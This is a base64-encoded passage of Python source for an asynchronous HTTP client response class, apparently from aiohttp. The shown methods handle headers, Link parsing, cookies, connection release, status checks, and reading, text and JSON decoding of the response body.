biAgICAgICAgcmV0dXJuIHNlbGYuX3VybFxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHVybF9vYmooc2VsZikgLT4gVVJMOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oIkRlcHJlY2F0ZWQsIHVzZSAudXJsICMxNjU0IiwgRGVwcmVjYXRpb25XYXJuaW5nLCBzdGFja2xldmVsPTIpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3VybFxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHJlYWxfdXJsKHNlbGYpIC0+IFVSTDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhbF91cmxcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBob3N0KHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBhc3NlcnQgc2VsZi5fdXJsLmhvc3QgaXMgbm90IE5vbmVcclxuICAgICAgICByZXR1cm4gc2VsZi5fdXJsLmhvc3RcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBoZWFkZXJzKHNlbGYpIC0+ICJDSU11bHRpRGljdFByb3h5W3N0cl0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9oZWFkZXJzXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgcmF3X2hlYWRlcnMoc2VsZikgLT4gUmF3SGVhZGVyczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmF3X2hlYWRlcnNcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiByZXF1ZXN0X2luZm8oc2VsZikgLT4gUmVxdWVzdEluZm86XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlcXVlc3RfaW5mb1xyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIGNvbnRlbnRfZGlzcG9zaXRpb24oc2VsZikgLT4gT3B0aW9uYWxbQ29udGVudERpc3Bvc2l0aW9uXTpcclxuICAgICAgICByYXcgPSBzZWxmLl9oZWFkZXJzLmdldChoZHJzLkNPTlRFTlRfRElTUE9TSVRJT04pXHJcbiAgICAgICAgaWYgcmF3IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgZGlzcG9zaXRpb25fdHlwZSwgcGFyYW1zX2RjdCA9IG11bHRpcGFydC5wYXJzZV9jb250ZW50X2Rpc3Bvc2l0aW9uKHJhdylcclxuICAgICAgICBwYXJhbXMgPSBNYXBwaW5nUHJveHlUeXBlKHBhcmFtc19kY3QpXHJcbiAgICAgICAgZmlsZW5hbWUgPSBtdWx0aXBhcnQuY29udGVudF9kaXNwb3NpdGlvbl9maWxlbmFtZShwYXJhbXMpXHJcbiAgICAgICAgcmV0dXJuIENvbnRlbnREaXNwb3NpdGlvbihkaXNwb3NpdGlvbl90eXBlLCBwYXJhbXMsIGZpbGVuYW1lKVxyXG5cclxuICAgIGRlZiBfX2RlbF9fKHNlbGYsIF93YXJuaW5nczogQW55ID0gd2FybmluZ3MpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgaWYgc2VsZi5fY29ubmVjdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fY29ubmVjdGlvbi5yZWxlYXNlKClcclxuICAgICAgICAgICAgc2VsZi5fY2xlYW51cF93cml0ZXIoKVxyXG5cclxuICAgICAgICAgICAgaWYgc2VsZi5fbG9vcC5nZXRfZGVidWcoKTpcclxuICAgICAgICAgICAgICAgIGlmIFBZXzM2OlxyXG4gICAgICAgICAgICAgICAgICAgIGt3YXJncyA9IHsic291cmNlIjogc2VsZn1cclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAga3dhcmdzID0ge31cclxuICAgICAgICAgICAgICAgIF93YXJuaW5ncy53YXJuKGYiVW5jbG9zZWQgcmVzcG9uc2Uge3NlbGYhcn0iLCBSZXNvdXJjZVdhcm5pbmcsICoqa3dhcmdzKVxyXG4gICAgICAgICAgICAgICAgY29udGV4dCA9IHsiY2xpZW50X3Jlc3BvbnNlIjogc2VsZiwgIm1lc3NhZ2UiOiAiVW5jbG9zZWQgcmVzcG9uc2UifVxyXG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fc291cmNlX3RyYWNlYmFjazpcclxuICAgICAgICAgICAgICAgICAgICBjb250ZXh0WyJzb3VyY2VfdHJhY2ViYWNrIl0gPSBzZWxmLl9zb3VyY2VfdHJhY2ViYWNrXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9sb29wLmNhbGxfZXhjZXB0aW9uX2hhbmRsZXIoY29udGV4dClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIG91dCA9IGlvLlN0cmluZ0lPKClcclxuICAgICAgICBhc2NpaV9lbmNvZGFibGVfdXJsID0gc3RyKHNlbGYudXJsKVxyXG4gICAgICAgIGlmIHNlbGYucmVhc29uOlxyXG4gICAgICAgICAgICBhc2NpaV9lbmNvZGFibGVfcmVhc29uID0gc2VsZi5yZWFzb24uZW5jb2RlKFxyXG4gICAgICAgICAgICAgICAgImFzY2lpIiwgImJhY2tzbGFzaHJlcGxhY2UiXHJcbiAgICAgICAgICAgICkuZGVjb2RlKCJhc2NpaSIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYXNjaWlfZW5jb2RhYmxlX3JlYXNvbiA9IHNlbGYucmVhc29uXHJcbiAgICAgICAgcHJpbnQoXHJcbiAgICAgICAgICAgICI8Q2xpZW50UmVzcG9uc2Uoe30pIFt7fSB7fV0+Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICBhc2NpaV9lbmNvZGFibGVfdXJsLCBzZWxmLnN0YXR1cywgYXNjaWlfZW5jb2RhYmxlX3JlYXNvblxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICBmaWxlPW91dCxcclxuICAgICAgICApXHJcbiAgICAgICAgcHJpbnQoc2VsZi5oZWFkZXJzLCBmaWxlPW91dClcclxuICAgICAgICByZXR1cm4gb3V0LmdldHZhbHVlKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb25uZWN0aW9uKHNlbGYpIC0+IE9wdGlvbmFsWyJDb25uZWN0aW9uIl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5lY3Rpb25cclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBoaXN0b3J5KHNlbGYpIC0+IFR1cGxlWyJDbGllbnRSZXNwb25zZSIsIC4uLl06XHJcbiAgICAgICAgIiIiQSBzZXF1ZW5jZSBvZiBvZiByZXNwb25zZXMsIGlmIHJlZGlyZWN0cyBvY2N1cnJlZC4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5faGlzdG9yeVxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIGxpbmtzKHNlbGYpIC0+ICJNdWx0aURpY3RQcm94eVtNdWx0aURpY3RQcm94eVtVbmlvbltzdHIsIFVSTF1dXSI6XHJcbiAgICAgICAgbGlua3Nfc3RyID0gIiwgIi5qb2luKHNlbGYuaGVhZGVycy5nZXRhbGwoImxpbmsiLCBbXSkpXHJcblxyXG4gICAgICAgIGlmIG5vdCBsaW5rc19zdHI6XHJcbiAgICAgICAgICAgIHJldHVybiBNdWx0aURpY3RQcm94eShNdWx0aURpY3QoKSlcclxuXHJcbiAgICAgICAgbGlua3MgPSBNdWx0aURpY3QoKSAgIyB0eXBlOiBNdWx0aURpY3RbTXVsdGlEaWN0UHJveHlbVW5pb25bc3RyLCBVUkxdXV1cclxuXHJcbiAgICAgICAgZm9yIHZhbCBpbiByZS5zcGxpdChyIiwoPz1cXHMqPCkiLCBsaW5rc19zdHIpOlxyXG4gICAgICAgICAgICBtYXRjaCA9IHJlLm1hdGNoKHIiXFxzKjwoLiopPiguKikiLCB2YWwpXHJcbiAgICAgICAgICAgIGlmIG1hdGNoIGlzIE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgICAgICMgdGhlIGNoZWNrIGV4aXN0cyB0byBzdXBwcmVzcyBteXB5IGVycm9yXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICB1cmwsIHBhcmFtc19zdHIgPSBtYXRjaC5ncm91cHMoKVxyXG4gICAgICAgICAgICBwYXJhbXMgPSBwYXJhbXNfc3RyLnNwbGl0KCI7IilbMTpdXHJcblxyXG4gICAgICAgICAgICBsaW5rID0gTXVsdGlEaWN0KCkgICMgdHlwZTogTXVsdGlEaWN0W1VuaW9uW3N0ciwgVVJMXV1cclxuXHJcbiAgICAgICAgICAgIGZvciBwYXJhbSBpbiBwYXJhbXM6XHJcbiAgICAgICAgICAgICAgICBtYXRjaCA9IHJlLm1hdGNoKHIiXlxccyooXFxTKilcXHMqPVxccyooW1wnXFwiXT8pKC4qPykoXFwyKVxccyokIiwgcGFyYW0sIHJlLk0pXHJcbiAgICAgICAgICAgICAgICBpZiBtYXRjaCBpcyBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICAgICAgICAgICAgICAgICAgIyB0aGUgY2hlY2sgZXhpc3RzIHRvIHN1cHByZXNzIG15cHkgZXJyb3JcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAga2V5LCBfLCB2YWx1ZSwgXyA9IG1hdGNoLmdyb3VwcygpXHJcblxyXG4gICAgICAgICAgICAgICAgbGluay5hZGQoa2V5LCB2YWx1ZSlcclxuXHJcbiAgICAgICAgICAgIGtleSA9IGxpbmsuZ2V0KCJyZWwiLCB1cmwpICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG5cclxuICAgICAgICAgICAgbGluay5hZGQoInVybCIsIHNlbGYudXJsLmpvaW4oVVJMKHVybCkpKVxyXG5cclxuICAgICAgICAgICAgbGlua3MuYWRkKGtleSwgTXVsdGlEaWN0UHJveHkobGluaykpXHJcblxyXG4gICAgICAgIHJldHVybiBNdWx0aURpY3RQcm94eShsaW5rcylcclxuXHJcbiAgICBhc3luYyBkZWYgc3RhcnQoc2VsZiwgY29ubmVjdGlvbjogIkNvbm5lY3Rpb24iKSAtPiAiQ2xpZW50UmVzcG9uc2UiOlxyXG4gICAgICAgICIiIlN0YXJ0IHJlc3BvbnNlIHByb2Nlc3NpbmcuIiIiXHJcbiAgICAgICAgc2VsZi5fY2xvc2VkID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9wcm90b2NvbCA9IGNvbm5lY3Rpb24ucHJvdG9jb2xcclxuICAgICAgICBzZWxmLl9jb25uZWN0aW9uID0gY29ubmVjdGlvblxyXG5cclxuICAgICAgICB3aXRoIHNlbGYuX3RpbWVyOlxyXG4gICAgICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICAgICAgIyByZWFkIHJlc3BvbnNlXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgcHJvdG9jb2wgPSBzZWxmLl9wcm90b2NvbFxyXG4gICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UsIHBheWxvYWQgPSBhd2FpdCBwcm90b2NvbC5yZWFkKCkgICMgdHlwZTogaWdub3JlW3VuaW9uLWF0dHJdXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgaHR0cC5IdHRwUHJvY2Vzc2luZ0Vycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBDbGllbnRSZXNwb25zZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJlcXVlc3RfaW5mbyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oaXN0b3J5LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXM9ZXhjLmNvZGUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U9ZXhjLm1lc3NhZ2UsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9ZXhjLmhlYWRlcnMsXHJcbiAgICAgICAgICAgICAgICAgICAgKSBmcm9tIGV4Y1xyXG5cclxuICAgICAgICAgICAgICAgIGlmIG1lc3NhZ2UuY29kZSA8IDEwMCBvciBtZXNzYWdlLmNvZGUgPiAxOTkgb3IgbWVzc2FnZS5jb2RlID09IDEwMTpcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICAgICAgICAgIGlmIHNlbGYuX2NvbnRpbnVlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHNldF9yZXN1bHQoc2VsZi5fY29udGludWUsIFRydWUpXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fY29udGludWUgPSBOb25lXHJcblxyXG4gICAgICAgICMgcGF5bG9hZCBlb2YgaGFuZGxlclxyXG4gICAgICAgIHBheWxvYWQub25fZW9mKHNlbGYuX3Jlc3BvbnNlX2VvZilcclxuXHJcbiAgICAgICAgIyByZXNwb25zZSBzdGF0dXNcclxuICAgICAgICBzZWxmLnZlcnNpb24gPSBtZXNzYWdlLnZlcnNpb25cclxuICAgICAgICBzZWxmLnN0YXR1cyA9IG1lc3NhZ2UuY29kZVxyXG4gICAgICAgIHNlbGYucmVhc29uID0gbWVzc2FnZS5yZWFzb25cclxuXHJcbiAgICAgICAgIyBoZWFkZXJzXHJcbiAgICAgICAgc2VsZi5faGVhZGVycyA9IG1lc3NhZ2UuaGVhZGVycyAgIyB0eXBlIGlzIENJTXVsdGlEaWN0UHJveHlcclxuICAgICAgICBzZWxmLl9yYXdfaGVhZGVycyA9IG1lc3NhZ2UucmF3X2hlYWRlcnMgICMgdHlwZSBpcyBUdXBsZVtieXRlcywgYnl0ZXNdXHJcblxyXG4gICAgICAgICMgcGF5bG9hZFxyXG4gICAgICAgIHNlbGYuY29udGVudCA9IHBheWxvYWRcclxuXHJcbiAgICAgICAgIyBjb29raWVzXHJcbiAgICAgICAgZm9yIGhkciBpbiBzZWxmLmhlYWRlcnMuZ2V0YWxsKGhkcnMuU0VUX0NPT0tJRSwgKCkpOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLmNvb2tpZXMubG9hZChoZHIpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBDb29raWVFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBjbGllbnRfbG9nZ2VyLndhcm5pbmcoIkNhbiBub3QgbG9hZCByZXNwb25zZSBjb29raWVzOiAlcyIsIGV4YylcclxuICAgICAgICByZXR1cm4gc2VsZlxyXG5cclxuICAgIGRlZiBfcmVzcG9uc2VfZW9mKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgaWYgc2VsZi5fY29ubmVjdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgIyB3ZWJzb2NrZXQsIHByb3RvY29sIGNvdWxkIGJlIE5vbmUgYmVjYXVzZVxyXG4gICAgICAgICAgICAjIGNvbm5lY3Rpb24gY291bGQgYmUgZGV0YWNoZWRcclxuICAgICAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY29ubmVjdGlvbi5wcm90b2NvbCBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICAgICAgYW5kIHNlbGYuX2Nvbm5lY3Rpb24ucHJvdG9jb2wudXBncmFkZWRcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICAgICAgc2VsZi5fY29ubmVjdGlvbi5yZWxlYXNlKClcclxuICAgICAgICAgICAgc2VsZi5fY29ubmVjdGlvbiA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5fY2xvc2VkID0gVHJ1ZVxyXG4gICAgICAgIHNlbGYuX2NsZWFudXBfd3JpdGVyKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjbG9zZWQoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2xvc2VkXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuX3JlbGVhc2VkOlxyXG4gICAgICAgICAgICBzZWxmLl9ub3RpZnlfY29udGVudCgpXHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VsZi5fY2xvc2VkID0gVHJ1ZVxyXG4gICAgICAgIGlmIHNlbGYuX2xvb3AgaXMgTm9uZSBvciBzZWxmLl9sb29wLmlzX2Nsb3NlZCgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgaWYgc2VsZi5fY29ubmVjdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fY29ubmVjdGlvbi5jbG9zZSgpXHJcbiAgICAgICAgICAgIHNlbGYuX2Nvbm5lY3Rpb24gPSBOb25lXHJcbiAgICAgICAgc2VsZi5fY2xlYW51cF93cml0ZXIoKVxyXG5cclxuICAgIGRlZiByZWxlYXNlKHNlbGYpIC0+IEFueTpcclxuICAgICAgICBpZiBub3Qgc2VsZi5fcmVsZWFzZWQ6XHJcbiAgICAgICAgICAgIHNlbGYuX25vdGlmeV9jb250ZW50KClcclxuICAgICAgICBpZiBzZWxmLl9jbG9zZWQ6XHJcbiAgICAgICAgICAgIHJldHVybiBub29wKClcclxuXHJcbiAgICAgICAgc2VsZi5fY2xvc2VkID0gVHJ1ZVxyXG4gICAgICAgIGlmIHNlbGYuX2Nvbm5lY3Rpb24gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2Nvbm5lY3Rpb24ucmVsZWFzZSgpXHJcbiAgICAgICAgICAgIHNlbGYuX2Nvbm5lY3Rpb24gPSBOb25lXHJcblxyXG4gICAgICAgIHNlbGYuX2NsZWFudXBfd3JpdGVyKClcclxuICAgICAgICByZXR1cm4gbm9vcCgpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb2soc2VsZikgLT4gYm9vbDpcclxuICAgICAgICAiIiJSZXR1cm5zIGBgVHJ1ZWBgIGlmIGBgc3RhdHVzYGAgaXMgbGVzcyB0aGFuIGBgNDAwYGAsIGBgRmFsc2VgYCBpZiBub3QuXHJcblxyXG4gICAgICAgIFRoaXMgaXMgKipub3QqKiBhIGNoZWNrIGZvciBgYDIwMCBPS2BgIGJ1dCBhIGNoZWNrIHRoYXQgdGhlIHJlc3BvbnNlXHJcbiAgICAgICAgc3RhdHVzIGlzIHVuZGVyIDQwMC5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gNDAwID4gc2VsZi5zdGF0dXNcclxuXHJcbiAgICBkZWYgcmFpc2VfZm9yX3N0YXR1cyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLm9rOlxyXG4gICAgICAgICAgICAjIHJlYXNvbiBzaG91bGQgYWx3YXlzIGJlIG5vdCBOb25lIGZvciBhIHN0YXJ0ZWQgcmVzcG9uc2VcclxuICAgICAgICAgICAgYXNzZXJ0IHNlbGYucmVhc29uIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIHNlbGYucmVsZWFzZSgpXHJcbiAgICAgICAgICAgIHJhaXNlIENsaWVudFJlc3BvbnNlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICBzZWxmLnJlcXVlc3RfaW5mbyxcclxuICAgICAgICAgICAgICAgIHNlbGYuaGlzdG9yeSxcclxuICAgICAgICAgICAgICAgIHN0YXR1cz1zZWxmLnN0YXR1cyxcclxuICAgICAgICAgICAgICAgIG1lc3NhZ2U9c2VsZi5yZWFzb24sXHJcbiAgICAgICAgICAgICAgICBoZWFkZXJzPXNlbGYuaGVhZGVycyxcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfY2xlYW51cF93cml0ZXIoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl93cml0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3dyaXRlci5jYW5jZWwoKVxyXG4gICAgICAgIHNlbGYuX3dyaXRlciA9IE5vbmVcclxuICAgICAgICBzZWxmLl9zZXNzaW9uID0gTm9uZVxyXG5cclxuICAgIGRlZiBfbm90aWZ5X2NvbnRlbnQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBjb250ZW50ID0gc2VsZi5jb250ZW50XHJcbiAgICAgICAgaWYgY29udGVudCBhbmQgY29udGVudC5leGNlcHRpb24oKSBpcyBOb25lOlxyXG4gICAgICAgICAgICBjb250ZW50LnNldF9leGNlcHRpb24oQ2xpZW50Q29ubmVjdGlvbkVycm9yKCJDb25uZWN0aW9uIGNsb3NlZCIpKVxyXG4gICAgICAgIHNlbGYuX3JlbGVhc2VkID0gVHJ1ZVxyXG5cclxuICAgIGFzeW5jIGRlZiB3YWl0X2Zvcl9jbG9zZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX3dyaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyXHJcbiAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl93cml0ZXIgPSBOb25lXHJcbiAgICAgICAgc2VsZi5yZWxlYXNlKClcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZChzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJSZWFkIHJlc3BvbnNlIHBheWxvYWQuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fYm9keSBpcyBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9ib2R5ID0gYXdhaXQgc2VsZi5jb250ZW50LnJlYWQoKVxyXG4gICAgICAgICAgICAgICAgZm9yIHRyYWNlIGluIHNlbGYuX3RyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCB0cmFjZS5zZW5kX3Jlc3BvbnNlX2NodW5rX3JlY2VpdmVkKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLm1ldGhvZCwgc2VsZi51cmwsIHNlbGYuX2JvZHlcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgIGVsaWYgc2VsZi5fcmVsZWFzZWQ6XHJcbiAgICAgICAgICAgIHJhaXNlIENsaWVudENvbm5lY3Rpb25FcnJvcigiQ29ubmVjdGlvbiBjbG9zZWQiKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fYm9keSAgIyB0eXBlOiBpZ25vcmVbbm8tYW55LXJldHVybl1cclxuXHJcbiAgICBkZWYgZ2V0X2VuY29kaW5nKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBjdHlwZSA9IHNlbGYuaGVhZGVycy5nZXQoaGRycy5DT05URU5UX1RZUEUsICIiKS5sb3dlcigpXHJcbiAgICAgICAgbWltZXR5cGUgPSBoZWxwZXJzLnBhcnNlX21pbWV0eXBlKGN0eXBlKVxyXG5cclxuICAgICAgICBlbmNvZGluZyA9IG1pbWV0eXBlLnBhcmFtZXRlcnMuZ2V0KCJjaGFyc2V0IilcclxuICAgICAgICBpZiBlbmNvZGluZzpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgY29kZWNzLmxvb2t1cChlbmNvZGluZylcclxuICAgICAgICAgICAgZXhjZXB0IExvb2t1cEVycm9yOlxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgPSBOb25lXHJcbiAgICAgICAgaWYgbm90IGVuY29kaW5nOlxyXG4gICAgICAgICAgICBpZiBtaW1ldHlwZS50eXBlID09ICJhcHBsaWNhdGlvbiIgYW5kIChcclxuICAgICAgICAgICAgICAgIG1pbWV0eXBlLnN1YnR5cGUgPT0gImpzb24iIG9yIG1pbWV0eXBlLnN1YnR5cGUgPT0gInJkYXAiXHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICAjIFJGQyA3MTU5IHN0YXRlcyB0aGF0IHRoZSBkZWZhdWx0IGVuY29kaW5nIGlzIFVURi04LlxyXG4gICAgICAgICAgICAgICAgIyBSRkMgNzQ4MyBkZWZpbmVzIGFwcGxpY2F0aW9uL3JkYXAranNvblxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgPSAidXRmLTgiXHJcbiAgICAgICAgICAgIGVsaWYgc2VsZi5fYm9keSBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJDYW5ub3QgZ3Vlc3MgdGhlIGVuY29kaW5nIG9mICIgImEgbm90IHlldCByZWFkIGJvZHkiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBlbmNvZGluZyA9IGNoYXJkZXQuZGV0ZWN0KHNlbGYuX2JvZHkpWyJlbmNvZGluZyJdXHJcbiAgICAgICAgaWYgbm90IGVuY29kaW5nOlxyXG4gICAgICAgICAgICBlbmNvZGluZyA9ICJ1dGYtOCJcclxuXHJcbiAgICAgICAgcmV0dXJuIGVuY29kaW5nXHJcblxyXG4gICAgYXN5bmMgZGVmIHRleHQoc2VsZiwgZW5jb2Rpbmc6IE9wdGlvbmFsW3N0cl0gPSBOb25lLCBlcnJvcnM6IHN0ciA9ICJzdHJpY3QiKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiUmVhZCByZXNwb25zZSBwYXlsb2FkIGFuZCBkZWNvZGUuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fYm9keSBpcyBOb25lOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLnJlYWQoKVxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBOb25lOlxyXG4gICAgICAgICAgICBlbmNvZGluZyA9IHNlbGYuZ2V0X2VuY29kaW5nKClcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JvZHkuZGVjb2RlKCAgIyB0eXBlOiBpZ25vcmVbbm8tYW55LXJldHVybix1bmlvbi1hdHRyXVxyXG4gICAgICAgICAgICBlbmNvZGluZywgZXJyb3JzPWVycm9yc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYganNvbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgZW5jb2Rpbmc6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGxvYWRzOiBKU09ORGVjb2RlciA9IERFRkFVTFRfSlNPTl9ERUNPREVSLFxyXG4gICAgICAgIGNvbnRlbnRfdHlwZTogT3B0aW9uYWxbc3RyXSA9ICJhcHBsaWNhdGlvbi9qc29uIixcclxuICAgICkgLT4gQW55OlxyXG4gICAgICAgICIiIlJlYWQgYW5kIGRlY29kZXMgSlNPTiByZXNwb25zZS4iIiJcclxuICAgICAgICBpZiBzZWxmLl9ib2R5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYucmVhZCgpXHJcblxyXG4gICAgICAgIGlmIGNvbnRlbnRfdHlwZTpcclxuICAgICAgICAgICAgY3R5cGUgPSBzZWxmLmhlYWRlcnMuZ2V0KGhkcnMuQ09OVEVOVF9UWVBFLCAiIikubG93ZXIoKVxyXG4gICAgICAgICAgICBpZiBub3QgX2lzX2V4cGVjdGVkX2NvbnRlbnRfdHlwZShjdHlwZSwgY29udGVudF90eXBlKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIENvbnRlbnRUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5yZXF1ZXN0X2luZm8sXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5oaXN0b3J5LFxyXG4gICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U9KFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiQXR0ZW1wdCB0byBkZWNvZGUgSlNPTiB3aXRoICIgInVuZXhwZWN0ZWQgbWltZXR5cGU6ICVzIiAlIGN0eXBlXHJcbiAgICAgICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPXNlbGYuaGVhZGVycyxcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc3RyaXBwZWQgPSBzZWxmLl9ib2R5LnN0cmlwKCkgICMgdHlwZTogaWdub3JlW3VuaW9uLWF0dHJdXHJcbiAgICAgICAgaWYgbm90IHN0cmlwcGVkOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBOb25lOlxyXG4gICAgICAgICAgICBlbmNvZGluZyA9IHNlbGYuZ2V0X2VuY29kaW5nKClcclxuXHJcbiAgICAgICAgcmV0dXJuIGxvYWRzKHN0cmlwcGVkLmRlY29kZShlbmNvZGluZykpXHJcblxyXG4gICAgYXN